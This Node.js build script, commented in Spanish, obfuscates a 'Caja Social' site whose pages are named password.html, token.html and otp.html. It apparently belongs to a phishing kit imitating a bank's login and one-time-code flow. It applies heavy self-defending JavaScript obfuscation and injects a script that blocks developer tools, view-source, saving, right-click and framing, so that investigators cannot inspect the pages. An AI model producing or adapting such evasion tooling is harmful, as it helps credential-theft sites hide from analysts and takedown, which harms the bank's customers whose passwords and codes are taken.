/* ============================================
   OFUSCAR CAJA SOCIAL + ANTI-INSPECCIÓN
   Ofusca HTML + CSS + JS y agrega anti-inspección
   ============================================ */

const fs = require('fs');
const path = require('path');
const JavaScriptObfuscator = require('javascript-obfuscator');
const { minify: minifyHTML } = require('html-minifier-terser');
const CleanCSS = require('clean-css');

// ============================================
// CONFIGURACIÓN
// ============================================
const CARPETA = path.join(__dirname, 'caja-social-build');

// Configuración del ofuscador JS
const CONFIG_JS = {
    compact: true,
    controlFlowFlattening: true,
    controlFlowFlatteningThreshold: 0.75,
    deadCodeInjection: true,
    deadCodeInjectionThreshold: 0.4,
    debugProtection: false,
    debugProtectionInterval: 0,
    disableConsoleOutput: true,
    identifierNamesGenerator: 'hexadecimal',
    log: false,
    numbersToExpressions: true,
    renameGlobals: false,
    selfDefending: true,
    simplify: true,
    splitStrings: true,
    splitStringsChunkLength: 10,
    stringArray: true,
    stringArrayCallsTransform: true,
    stringArrayEncoding: ['base64'],
    stringArrayIndexShift: true,
    stringArrayRotate: true,
    stringArrayShuffle: true,
    stringArrayWrappersCount: 2,
    stringArrayWrappersChainedCalls: true,
    stringArrayWrappersParametersMaxCount: 4,
    stringArrayWrappersType: 'function',
    stringArrayThreshold: 0.75,
    unicodeEscapeSequence: false,
    transformObjectKeys: true
};

// ============================================
// BLOQUE ANTI-INSPECCIÓN
// ============================================
const BLOQUE_ANTI = `
<script>
(function(){
'use strict';
var _0xa1=0;
document.addEventListener('touchend',function(_0xb2){
var _0xc3=new Date().getTime();
if(_0xc3-_0xa1<=300){_0xb2.preventDefault();}
_0xa1=_0xc3;
},{passive:false});
document.addEventListener('dblclick',function(_0xd4){_0xd4.preventDefault();});
document.addEventListener('contextmenu',function(_0xe5){_0xe5.preventDefault();return false;});
document.addEventListener('keydown',function(_0xf6){
var _0xg7=(_0xf6.key||'').toLowerCase();
var _0xh8=_0xf6.ctrlKey||_0xf6.metaKey;
var _0xi9=_0xf6.shiftKey;
if(_0xg7==='f12'){_0xf6.preventDefault();return false;}
if(_0xh8&&_0xi9&&(_0xg7==='i'||_0xg7==='j'||_0xg7==='c')){_0xf6.preventDefault();return false;}
if(_0xh8&&_0xg7==='u'){_0xf6.preventDefault();return false;}
if(_0xh8&&_0xg7==='s'){_0xf6.preventDefault();return false;}
});
document.addEventListener('dragstart',function(_0xj0){_0xj0.preventDefault();});
try{if(window.top!==window.self){window.top.location=window.self.location;}}catch(_0xk1){document.body.innerHTML='';}
})();
</script>
`;

// ============================================
// FUNCIONES
// ============================================
function ofuscarJS(archivo) {
    const ruta = path.join(CARPETA, archivo);
    if (!fs.existsSync(ruta)) {
        console.log(`   ⚠️  No existe: ${archivo}`);
        return;
    }

    try {
        const codigo = fs.readFileSync(ruta, 'utf8');
        const resultado = JavaScriptObfuscator.obfuscate(codigo, CONFIG_JS);
        fs.writeFileSync(ruta, resultado.getObfuscatedCode());
        console.log(`   ✅ ${archivo}`);
    } catch (err) {
        console.log(`   ❌ Error en ${archivo}: ${err.message}`);
    }
}

async function minificarHTML(archivo) {
    const ruta = path.join(CARPETA, archivo);
    if (!fs.existsSync(ruta)) {
        console.log(`   ⚠️  No existe: ${archivo}`);
        return;
    }

    try {
        let codigo = fs.readFileSync(ruta, 'utf8');

        // 1. Insertar anti-inspección antes de </body> si no existe
        if (codigo.indexOf('_0xa1=0') === -1) {
            if (codigo.indexOf('</body>') !== -1) {
                codigo = codigo.replace('</body>', BLOQUE_ANTI + '</body>');
            } else {
                codigo += BLOQUE_ANTI;
            }
        }

        // 2. Minificar
        const resultado = await minifyHTML(codigo, {
            collapseWhitespace: true,
            removeComments: true,
            removeRedundantAttributes: true,
            removeScriptTypeAttributes: true,
            removeStyleLinkTypeAttributes: true,
            useShortDoctype: true,
            minifyCSS: true,
            minifyJS: false
        });
        fs.writeFileSync(ruta, resultado);
        console.log(`   ✅ ${archivo}`);
    } catch (err) {
        console.log(`   ❌ Error en ${archivo}: ${err.message}`);
    }
}

function minificarCSS(archivo) {
    const ruta = path.join(CARPETA, archivo);
    if (!fs.existsSync(ruta)) {
        console.log(`   ⚠️  No existe: ${archivo}`);
        return;
    }

    try {
        const codigo = fs.readFileSync(ruta, 'utf8');
        const resultado = new CleanCSS({ level: 2 }).minify(codigo);
        fs.writeFileSync(ruta, resultado.styles);
        console.log(`   ✅ ${archivo}`);
    } catch (err) {
        console.log(`   ❌ Error en ${archivo}: ${err.message}`);
    }
}

// ============================================
// EJECUTAR
// ============================================
async function main() {
    console.log('\n🔒 OFUSCANDO CAJA SOCIAL + ANTI-INSPECCIÓN\n');

    // Minificar HTML + insertar anti-inspección
    console.log('📄 Minificando HTML + agregando anti-inspección:');
    await minificarHTML('index.html');
    await minificarHTML('password.html');
    await minificarHTML('token.html');
    await minificarHTML('otp.html');

    // Minificar CSS
    console.log('\n📄 Minificando CSS:');
    minificarCSS('styles.css');

    console.log('\n✅ CAJA SOCIAL OFUSCADO + PROTEGIDO CORRECTAMENTE\n');
    console.log('🔒 Anti-inspección activado:');
    console.log('   ❌ F12 bloqueado');
    console.log('   ❌ Ctrl+Shift+I bloqueado');
    console.log('   ❌ Ctrl+U bloqueado');
    console.log('   ❌ Ctrl+S bloqueado');
    console.log('   ❌ Click derecho bloqueado');
    console.log('   ❌ Arrastrar bloqueado');
    console.log('   ❌ Iframes bloqueados\n');
}

main();